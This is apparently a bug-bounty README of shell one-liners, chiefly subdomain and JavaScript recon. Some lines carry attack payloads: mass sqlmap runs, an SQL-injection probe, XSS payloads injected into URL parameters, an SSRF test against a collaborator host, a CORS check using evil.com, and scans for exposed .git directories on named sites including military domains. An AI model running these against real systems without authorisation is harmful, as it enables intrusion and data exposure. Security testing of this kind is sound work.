## 👑 What is KingOfOneLineTips Project ? 👑

Our main goal is to share tips from some well-known bughunters. Using recon methodology, we are able to find subdomains, apis, and tokens that are already exploitable, so we can report them. We wish to influence Onelinetips and explain the commands, for the better understanding of new hunters..

Want to earn 100 dollars using my code on ocean-digital? https://m.do.co/c/703ff752fd6f

## Join Us

[![Telegram](https://patrolavia.github.io/telegram-badge/chat.png)](https://t.me/joinchat/DN_iQksIuhyPKJL1gw0ttA)
[![The King](https://aleen42.github.io/badges/src/twitter.svg)](https://twitter.com/ofjaaah)


## Special thanks

- [@Stokfredrik](https://twitter.com/stokfredrik)
- [@Jhaddix](https://twitter.com/Jhaddix)
- [@pdiscoveryio](https://twitter.com/pdiscoveryio)
- [@TomNomNom](https://twitter.com/TomNomNom)
- [@jeff_foley](https://twitter.com/@jeff_foley)
- [@NahamSec](https://twitter.com/NahamSec)
- [@j3ssiejjj](https://twitter.com/j3ssiejjj)
- [@zseano](https://twitter.com/zseano)
- [@pry0cc](https://twitter.com/pry0cc)

## Scripts that need to be installed

To run the project, you will need to install the following programs:

- [Anew](https://github.com/tomnomnom/anew)
- [Qsreplace](https://github.com/tomnomnom/qsreplace)
- [Subfinder](https://github.com/projectdiscovery/subfinder)
- [Gospider](https://github.com/jaeles-project/gospider)
- [Github-Search](https://github.com/gwen001/github-search)
- [Amass](https://github.com/OWASP/Amass)
- [Hakrawler](https://github.com/hakluke/hakrawler)
- [Gargs](https://github.com/brentp/gargs)
- [Chaos](https://github.com/projectdiscovery/chaos-client)
- [Httpx](https://github.com/projectdiscovery/httpx)
- [Jaeles](https://github.com/jaeles-project/jaeles)
- [Findomain](https://github.com/Edu4rdSHL/findomain)
- [Gf](https://github.com/tomnomnom/gf)
- [Unew](https://github.com/dwisiswant0/unew)
- [Rush](https://github.com/shenwei356/rush)
- [Jsubfinder](https://github.com/hiddengearz/jsubfinder)
- [Shuffledns](https://github.com/projectdiscovery/shuffledns)
- [haktldextract](https://github.com/hakluke/haktldextract)
- [Gau](https://github.com/lc/gau)
- [Axiom](https://github.com/pry0cc/axiom)
- [Html-tools](https://github.com/tomnomnom/hacks/tree/master/html-tool)
- [Dalfox](https://github.com/hahwul/dalfox)

### OneLiners

###  Extract urls to source code comments

- [Explaining command](https://bit.ly/2MKkOxm)

```bash
cat urls1 | html-tool comments | grep -oE '\b(https?|http)://[-A-Za-z0-9+&@#/%?=~_|!:,.;]*[-A-Za-z0-9+&@#/%=~_|]' 
```

###  Axiom recon "complete"

- [Explaining command](https://bit.ly/2NIavul)

```bash
findomain -t domain -q -u url ; axiom-scan url -m subfinder -o subs --threads 3 ; axiom-scan subs -m httpx -o http ; axiom-scan http -m ffuf --threads 15 -o ffuf-output ; cat ffuf-output | tr "," " " | awk '{print $2}' | fff | grep 200 | sort -u 
```

###  Domain subdomain extraction 

- [Explaining command](https://bit.ly/3c2t6eG)

```bash
cat url | haktldextract -s -t 16 | tee subs.txt ; xargs -a subs.txt -I@ sh -c 'assetfinder -subs-only @ | anew | httpx -silent  -threads 100 | anew httpDomain'

```


###  Search .js using 

- [Explaining command](https://bit.ly/362LyQF)

```bash
assetfinder -subs-only DOMAIN -silent | httpx -timeout 3 -threads 300 --follow-redirects -silent | xargs -I% -P10 sh -c 'hakrawler -plain -linkfinder -depth 5 -url %' | awk '{print $3}' | grep -E "\.js(?:onp?)?$" | anew
```


###  This one was huge ... But it collects .js gau + wayback + gospider and makes an analysis of the js. tools you need below.

- [Explaining command](https://bit.ly/3sD0pLv)

```bash
cat dominios | gau |grep -iE '\.js'|grep -iEv '(\.jsp|\.json)' >> gauJS.txt ; cat dominios | waybackurls | grep -iE '\.js'|grep -iEv '(\.jsp|\.json)' >> waybJS.txt ; gospider -a -S dominios -d 2 | grep -Eo "(http|https)://[^/\"].*\.js+" | sed "s#\] \- #\n#g" >> gospiderJS.txt ; cat gauJS.txt waybJS.txt gospiderJS.txt | sort -u >> saidaJS ; rm -rf *.txt ; cat saidaJS | anti-burl |awk '{print $4}' | sort -u >> AliveJs.txt ; xargs -a AliveJs.txt -n 2 -I@ bash -c "echo -e '\n[URL]: @\n'; python3 linkfinder.py -i @ -o cli" ; cat AliveJs.txt  | python3 collector.py output ; rush -i output/urls.txt 'python3 SecretFinder.py -i {} -o cli | sort -u >> output/resultJSPASS'
```


###  My recon automation simple. OFJAAAH.sh

- [Explaining command](https://bit.ly/3nWHM22)

```bash
amass enum -d $1 -o amass1 ; chaos -d $1 -o chaos1 -silent ; assetfinder $1 >> assetfinder1 ; subfinder -d $1 -o subfinder1 ; findomain -t $1 -q -u findomain1 ;python3 /root/PENTESTER/github-search/github-subdomains.py -t YOURTOKEN -d $1 >> github ; cat assetfinder1 subfinder1 chaos1 amass1 findomain1 subfinder1 github >> hosts ; subfinder -dL hosts -o full -timeout 10 -silent ; httpx -l hosts -silent -threads 9000 -timeout 30 | anew domains ; rm -rf amass1 chaos1 assetfinder1 subfinder1 findomain1  github
```

###  Download all domains to bounty chaos

- [Explaining command](https://bit.ly/38wPQ4o)

```bash
wget https://raw.githubusercontent.com/KingOfBugbounty/KingOfBugBountyTips/master/downlink ; xargs -a downlink -I@ sh -c 'wget @ -q'; mkdir bounty ; unzip '*.zip' -d bounty/ ; rm -rf *zip ; cat bounty/*.txt >> allbounty ; sort -u allbounty >> domainsBOUNTY ; rm -rf allbounty bounty/ ; echo '@OFJAAAH'
```

###  Recon to search SSRF Test

- [Explaining command](https://bit.ly/3shFFJ5)

```bash
findomain -t DOMAIN -q | httpx -silent -threads 1000 | gau |  grep "=" | qsreplace http://YOUR.burpcollaborator.net
```


###  ShuffleDNS to domains in file scan nuclei.

- [Explaining command](https://bit.ly/2L3YVsc)

```bash
xargs -a domain -I@ -P500 sh -c 'shuffledns -d "@" -silent -w words.txt -r resolvers.txt' | httpx -silent -threads 1000 | nuclei -t /root/nuclei-templates/ -o re1
```


###  Search Asn Amass

- [Explaining command](https://bit.ly/2EMooDB)

Amass intel will search the organization "paypal" from a database of ASNs at a faster-than-default rate. It will then take these ASN numbers and scan the complete ASN/IP space for all tld's in that IP space (paypal.com, paypal.co.id, paypal.me)

```bash
amass intel -org paypal -max-dns-queries 2500 | awk -F, '{print $1}' ORS=',' | sed 's/,$//' | xargs -P3 -I@ -d ',' amass intel -asn @ -max-dns-queries 2500''
```

###  SQLINJECTION Mass domain file

- [Explaining command](https://bit.ly/354lYuf)

```bash

httpx -l domains -silent -threads 1000 | xargs -I@ sh -c 'findomain -t @ -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1'
```


###  Using chaos search js


- [Explaining command](https://bit.ly/32vfRg7)

Chaos is an API by Project Discovery that discovers subdomains. Here we are querying thier API for all known subdoains of "att.com". We are then using httpx to find which of those domains is live and hosts an HTTP or HTTPs site. We then pass those URLs to GoSpider to visit them and crawl them for all links (javascript, endpoints, etc). We then grep to find all the JS files. We pipe this all through anew so we see the output iterativlely (faster) and grep for "(http|https)://att.com" to make sure we dont recieve output for domains that are not "att.com".

```bash
chaos -d att.com | httpx -silent | xargs -I@ -P20 sh -c 'gospider -a -s "@" -d 2' | grep -Eo "(http|https)://[^/"].*.js+" | sed "s#]
```

###  Search Subdomain using Gospider


- [Explaining command](https://bit.ly/2QtG9do)

GoSpider to visit them and crawl them for all links (javascript, endpoints, etc) we use some blacklist, so that it doesn’t travel, not to delay, grep is a command-line utility for searching plain-text data sets for lines that match a regular expression to search HTTP and HTTPS

```bash
gospider -d 0 -s "https://site.com" -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | anew
```

###  Using gospider to chaos


- [Explaining command](https://bit.ly/2D4vW3W)

GoSpider to visit them and crawl them for all links (javascript, endpoints, etc) chaos is a subdomain search project, to use it needs the api, to xargs is a command on Unix and most Unix-like operating systems used to build and execute commands from standard input.


```bash
chaos -d paypal.com -bbq -filter-wildcard -http-url | xargs -I@ -P5 sh -c 'gospider -a -s "@" -d 3'
```

###  Using recon.dev and gospider crawler subdomains

- [Explaining command](https://bit.ly/32pPRDa)

We will use recon.dev api to extract ready subdomains infos, then parsing output json with jq, replacing with a Stream EDitor all blank spaces
If anew, we can sort and display unique domains on screen, redirecting this output list to httpx to create a new list with just alive domains.
Xargs is being used to deal with gospider with 3 parallel proccess and then using grep within regexp just taking http urls.

```bash
curl "https://recon.dev/api/search?key=apiKEY&domain=paypal.com" |jq -r '.[].rawDomains[]' | sed 's/ //g' | anew |httpx -silent | xargs -P3 -I@ gospider -d 0 -s @ -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | anew
```

###  PSQL - search subdomain using cert.sh

- [Explaining command](https://bit.ly/32rMA6e)

Make use of pgsql cli of crt.sh, replace all comma to new lines and grep just twitch text domains with anew to confirm unique outputs

```bash
psql -A -F , -f querycrt -h http://crt.sh -p 5432 -U guest certwatch 2>/dev/null | tr ', ' '\n' | grep twitch | anew
```

###  Search subdomains using github and httpx

- [Github-search](https://github.com/gwen001/github-search)

Using python3 to search subdomains, httpx filter hosts by up status-code response (200)

```python
./github-subdomains.py -t APYKEYGITHUB -d domaintosearch | httpx --title
```

###  Search SQLINJECTION using qsreplace search syntax error

- [Explained command](https://bit.ly/3hxFWS2)

```bash
grep "="  .txt| qsreplace "' OR '1" | httpx -silent -store-response-dir output -threads 100 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" || printf "TARGET \033[0;31mNot Vulnerable\e[m\n"
```

###  Search subdomains using jldc

- [Explained command](https://bit.ly/2YBlEjm)

```bash
curl -s "https://jldc.me/anubis/subdomains/att.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | anew
```

###  Search subdomains in assetfinder using hakrawler spider to search links in content responses

- [Explained command](https://bit.ly/3hxRvZw)

```bash
assetfinder -subs-only tesla.com -silent | httpx -timeout 3 -threads 300 --follow-redirects -silent | xargs -I% -P10 sh -c 'hakrawler -plain -linkfinder -depth 5 -url %' | grep "tesla"
```

###  Search subdomains in cert.sh

- [Explained command](https://bit.ly/2QrvMXl)

```bash
curl -s "https://crt.sh/?q=%25.att.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | httpx -title -silent | anew
```

###  Search subdomains in cert.sh assetfinder to search in link /.git/HEAD

- [Explained command](https://bit.ly/3lhFcTH)

```bash
curl -s "https://crt.sh/?q=%25.tesla.com&output=json" | jq -r '.[].name_value' | assetfinder -subs-only | sed 's#$#/.git/HEAD#g' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
```
```bash
curl -s "https://crt.sh/?q=%25.enjoei.com.br&output=json" | jq -r '.[].name_value' | assetfinder -subs-only | httpx -silent -path /.git/HEAD -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
```
###  Collect js files from hosts up by gospider

- [Explained command](https://bit.ly/3aWIwyI)

```bash
xargs -P 500 -a pay -I@ sh -c 'nc -w1 -z -v @ 443 2>/dev/null && echo @' | xargs -I@ -P10 sh -c 'gospider -a -s "https://@" -d 2 | grep -Eo "(http|https)://[^/\"].*\.js+" | sed "s#\] \- #\n#g" | anew'
```

###  Subdomain search Bufferover resolving domain to httpx

- [Explained command](https://bit.ly/3lno9j0)

```bash
curl -s https://dns.bufferover.run/dns?q=.sony.com |jq -r .FDNS_A[] | sed -s 's/,/\n/g' | httpx -silent | anew
```

###  Using gargs to gospider search with parallel proccess
- [Gargs](https://github.com/brentp/gargs)

- [Explained command](https://bit.ly/2EHj1FD)

```bash
httpx -ports 80,443,8009,8080,8081,8090,8180,8443 -l domain -timeout 5 -threads 200 --follow-redirects -silent | gargs -p 3 'gospider -m 5 --blacklist pdf -t 2 -c 300 -d 5 -a -s {}' | anew stepOne
```

###  Injection xss using qsreplace to urls filter to gospider

- [Explained command](https://bit.ly/3joryw9)

```bash
gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
```

###  Extract URL's to apk

- [Explained command](https://bit.ly/2QzXwJr)

```bash
apktool d app.apk -o uberApk;grep -Phro "(https?://)[\w\.-/]+[\"'\`]" uberApk/ | sed 's#"##g' | anew | grep -v "w3\|android\|github\|schemas.android\|google\|goo.gl"
```

###  Chaos to Gospider

- [Explained command](https://bit.ly/3gFJbpB)

```bash
chaos -d att.com -o att -silent | httpx -silent | xargs -P100 -I@ gospider -c 30 -t 15 -d 4 -a -H "x-forwarded-for: 127.0.0.1" -H "User-Agent: Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1" -s @
```

###  Checking invalid certificate

- [Real script](https://bit.ly/2DhAwMo)
- [Script King](https://bit.ly/34Z0kIH)

```bash
xargs -a domain -P1000 -I@ sh -c 'bash cert.sh @ 2> /dev/null' | grep "EXPIRED" | awk '/domain/{print $5}' | httpx
```

###  Using shodan & Nuclei

- [Explained command](https://bit.ly/3jslKle)

Shodan is a search engine that lets the user find specific types of computers connected to the internet, AWK Cuts the text and prints the third column.
httpx is a fast and multi-purpose HTTP using -silent. Nuclei is a fast tool for configurable targeted scanning based on templates offering massive extensibility and ease of use, You need to download the nuclei templates.

```bash
shodan domain DOMAIN TO BOUNTY | awk '{print $3}' | httpx -silent | nuclei -t /nuclei-templates/
```

###  Open Redirect test using gf.

- [Explained command](https://bit.ly/3hL263x)

echo is a command that outputs the strings it is being passed as arguments. What to Waybackurls? Accept line-delimited domains on stdin, fetch known URLs from the Wayback Machine for .domain.com and output them on stdout. Httpx? is a fast and multi-purpose HTTP. GF? A wrapper around grep to avoid typing common patterns and anew Append lines from stdin to a file, but only if they don't already appear in the file. Outputs new lines to stdout too, removes duplicates.

```bash
echo "domain" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf redirect | anew
```

###  Using shodan to jaeles "How did I find a critical today? well as i said it was very simple, using shodan and jaeles".

- [Explained command](https://bit.ly/2QQfY0l)

```bash
shodan domain domain| awk '{print $3}'|  httpx -silent | anew | xargs -I@ jaeles scan -c 100 -s /jaeles-signatures/ -u @
```
###  Using Chaos to jaeles "How did I find a critical today?.

- [Explained command](https://bit.ly/2YXiK8N)

To chaos this project to projectdiscovery, Recon subdomains, using httpx, if we see the output from chaos domain.com we need it to be treated as http or https, so we use httpx to get the results. We use anew, a tool that removes duplicates from @TomNomNom, to get the output treated for import into jaeles, where he will scan using his templates. 

```bash
chaos -d domain | httpx -silent | anew | xargs -I@ jaeles scan -c 100 -s /jaeles-signatures/ -u @ 
```

###  Using shodan to jaeles

- [Explained command](https://bit.ly/2Dkmycu)

```bash
domain="domaintotest";shodan domain $domain | awk -v domain="$domain" '{print $1"."domain}'| httpx -threads 300 | anew shodanHostsUp | xargs -I@ -P3 sh -c 'jaeles -c 300 scan -s jaeles-signatures/ -u @'| anew JaelesShodanHosts 
```

###  Search to files using assetfinder and ffuf

- [Explained command](https://bit.ly/2Go3Ba4)

```bash
assetfinder att.com | sed 's#*.# #g' | httpx -silent -threads 10 | xargs -I@ sh -c 'ffuf -w path.txt -u @/FUZZ -mc 200 -H "Content-Type: application/json" -t 150 -H "X-Forwarded-For:127.0.0.1"'
```

###  HTTPX using new mode location and injection XSS using qsreplace.

- [Explained command](https://bit.ly/2Go3Ba4)

```bash
httpx -l master.txt -silent -no-color -threads 300 -location 301,302 | awk '{print $2}' | grep -Eo '(http|https)://[^/"].*' | tr -d '[]' | anew  | xargs -I@ sh -c 'gospider -d 0 -s @' | tr ' ' '\n' | grep -Eo '(http|https)://[^/"].*' | grep "=" | qsreplace "<svg onload=alert(1)>" "'
```

###  Grap internal juicy paths and do requests to them.

- [Explained command](https://bit.ly/357b1IY)

```bash
export domain="https://target";gospider -s $domain -d 3 -c 300 | awk '/linkfinder/{print $NF}' | grep -v "http" | grep -v "http" | unfurl paths | anew | xargs -I@ -P50 sh -c 'echo $domain@ | httpx -silent -content-length'
```

###  Download to list bounty targets We inject using the sed .git/HEAD command at the end of each url.

- [Explained command](https://bit.ly/2R2gNn5)

```bash
wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv | cat domains.txt | sed 's#$#/.git/HEAD#g' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
```

###  Using to findomain to SQLINJECTION.

- [Explained command](https://bit.ly/2ZeAhcF)

```bash
findomain -t testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1
```

###  Jaeles scan to bugbounty targets.

- [Explained command](https://bit.ly/3jXbTnU)

```bash
wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv ; cat domains.txt | anew | httpx -silent -threads 500 | xargs -I@ jaeles scan -s /jaeles-signatures/ -u @
```

###  JLDC domain search subdomain, using rush and jaeles.

- [Explained command](https://bit.ly/3hfNV5k)

```bash
curl -s "https://jldc.me/anubis/subdomains/sony.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | httpx -silent -threads 300 | anew | rush -j 10 'jaeles scan -s /jaeles-signatures/ -u {}'
```

###  Chaos to search subdomains check cloudflareip scan port.

- [Explained command](https://bit.ly/3hfNV5k)

```bash
chaos -silent -d paypal.com | filter-resolved | cf-check | anew | naabu -rate 60000 -silent -verify | httpx -title -silent
```
###  Search JS to domains file.

- [Explained command](https://bit.ly/2Zs13yj)

```bash
cat FILE TO TARGET | httpx -silent | subjs | anew
```

###  Search JS using assetfinder, rush and hakrawler.

- [Explained command](https://bit.ly/3ioYuV0)

```bash
assetfinder -subs-only paypal.com -silent | httpx -timeout 3 -threads 300 --follow-redirects -silent | rush 'hakrawler -plain -linkfinder -depth 5 -url {}' | grep "paypal"
```

###  Search to CORS using assetfinder and rush

- [Explained command](https://bit.ly/33qT71x)

```bash
assetfinder fitbit.com | httpx -threads 300 -follow-redirects -silent | rush -j200 'curl -m5 -s -I -H "Origin:evil.com" {} |  [[ $(grep -c "evil.com") -gt 0 ]] && printf "\n\033[0;32m[VUL TO CORS] - {}\e[m"' 2>/dev/null"
```

###  Search to js using hakrawler and rush & unew

- [Explained command](https://bit.ly/2Rqn9gn)

```bash
tac hostsGospider | rush -j 100 'hakrawler -js -plain -usewayback -depth 6 -scope subs -url {} | unew hakrawlerHttpx'
```

###  XARGS to dirsearch brute force.

- [Explained command](https://bit.ly/32MZfCa)

```bash
cat hosts | xargs -I@ sh -c 'python3 dirsearch.py -r -b -w path -u @ -i 200, 403, 401, 302 -e php,html,json,aspx,sql,asp,js' 
```

###  Assetfinder to run massdns.

- [Explained command](https://bit.ly/32T5W5O)

```bash
assetfinder DOMAIN --subs-only | anew | massdns -r lists/resolvers.txt -t A -o S -w result.txt ; cat result.txt | sed 's/A.*//; s/CN.*// ; s/\..$//' | httpx -silent
```

###  Extract path to js

- [Explained command](https://bit.ly/3icrr5R)

```bash
cat file.js | grep -aoP "(?<=(\"|\'|\`))\/[a-zA-Z0-9_?&=\/\-\#\.]*(?=(\"|\'|\`))" | sort -u 
```

###  Find subdomains and Secrets with jsubfinder

- [Explained command](https://bit.ly/3dvP6xq)

```bash
cat subdomsains.txt | httpx --silent | jsubfinder -s
```

###  Search domains to Range-IPS.

- [Explained command](https://bit.ly/3fa0eAO)

```bash
cat dod1 | awk '{print $1}' | xargs -I@ sh -c 'prips @ | hakrevdns -r 1.1.1.1' | awk '{print $2}' | sed -r 's/.$//g' | httpx -silent -timeout 25 | anew 
```

###  Search new's domains using dnsgen.

- [Explained command](https://bit.ly/3kNTHNm)

```bash
xargs -a army1 -I@ sh -c 'echo @' | dnsgen - | httpx -silent -threads 10000 | anew newdomain
```

###  List ips, domain extract, using amass + wordlist

- [Explained command](https://bit.ly/2JpRsmS)

```bash
amass enum -src -ip -active -brute -d navy.mil -o domain ; cat domain | cut -d']' -f 2 | awk '{print $1}' | sort -u > hosts-amass.txt ; cat domain | cut -d']' -f2 | awk '{print $2}' | tr ',' '\n' | sort -u > ips-amass.txt ; curl -s "https://crt.sh/?q=%.navy.mil&output=json" | jq '.[].name_value' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u > hosts-crtsh.txt ; sed 's/$/.navy.mil/' dns-Jhaddix.txt_cleaned > hosts-wordlist.txt ; cat hosts-amass.txt hosts-crtsh.txt hosts-wordlist.txt | sort -u > hosts-all.txt
```
###  Search domains using amass and search vul to nuclei.

- [Explained command](https://bit.ly/3gsbzNt)

```bash
amass enum -passive -norecursive -d disa.mil -o domain ; httpx -l domain -silent -threads 10 | nuclei -t PATH -o result -timeout 30 
```

###  Verify to cert using openssl.

- [Explained command](https://bit.ly/37avq0C)

```bash
sed -ne 's/^\( *\)Subject:/\1/p;/X509v3 Subject Alternative Name/{
    N;s/^.*\n//;:a;s/^\( *\)\(.*\), /\1\2\n\1/;ta;p;q; }' < <(
    openssl x509 -noout -text -in <(
        openssl s_client -ign_eof 2>/dev/null <<<$'HEAD / HTTP/1.0\r\n\r' \
            -connect hackerone.com:443 ) )
```


###  Search domains using openssl to cert.

- [Explained command](https://bit.ly/3m9AsOY)

```bash
xargs -a recursivedomain -P50 -I@ sh -c 'openssl s_client -connect @:443 2>&1 '| sed -E -e 's/[[:blank:]]+/\n/g' | httpx -silent -threads 1000 | anew 
```



### Search to Hackers.

- [Censys](https://censys.io)
- [Spyce](https://spyce.com)
- [Shodan](https://shodan.io)
- [Viz Grey](https://viz.greynoise.io)
- [Zoomeye](https://zoomeye.org)
- [Onyphe](https://onyphe.io)
- [Wigle](https://wigle.net)
- [Intelx](https://intelx.io)
- [Fofa](https://fofa.so)
- [Hunter](https://hunter.io)
- [Zorexeye](https://zorexeye.com)
- [Pulsedive](https://pulsedive.com)
- [Netograph](https://netograph.io)
- [Vigilante](https://vigilante.pw)
- [Pipl](https://pipl.com)
- [Abuse](https://abuse.ch)
- [Cert-sh](https://cert.sh)
- [Maltiverse](https://maltiverse.com/search)
- [Insecam](https://insecam.org)
- [Anubis](https://https://jldc.me/anubis/subdomains/att.com)
- [Dns Dumpster](https://dnsdumpster.com)
- [PhoneBook](https://phonebook.cz)
- [Inquest](https://labs.inquest.net)
- [Scylla](https://scylla.sh)


# Project

[![made-with-Go](https://img.shields.io/badge/Made%20with-Go-1f425f.svg)](http://golang.org)
[![made-with-bash](https://img.shields.io/badge/Made%20with-Bash-1f425f.svg)](https://www.gnu.org/software/bash/)
[![Open Source? Yes!](https://badgen.net/badge/Open%20Source%20%3F/Yes%21/blue?icon=github)](https://github.com/Naereen/badges/)
[![Telegram](https://patrolavia.github.io/telegram-badge/chat.png)](https://t.me/KingOfTipsBugBounty)



<a href="https://www.buymeacoffee.com/OFJAAAH" target="_blank"><img src="https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png" alt="Buy Me A Coffee" style="height: 20px !important;width: 50px !important;box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;" ></a>


